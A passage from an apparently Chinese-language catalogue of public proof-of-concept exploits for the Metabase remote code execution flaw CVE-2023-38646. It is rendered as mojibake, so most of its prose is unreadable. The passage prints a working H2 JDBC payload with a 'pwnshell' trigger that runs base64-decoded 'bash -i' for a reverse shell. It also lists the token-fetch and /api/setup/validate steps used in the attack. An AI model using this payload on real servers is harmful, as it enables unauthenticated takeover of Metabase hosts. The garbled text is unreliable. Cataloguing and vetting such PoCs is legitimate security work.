3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
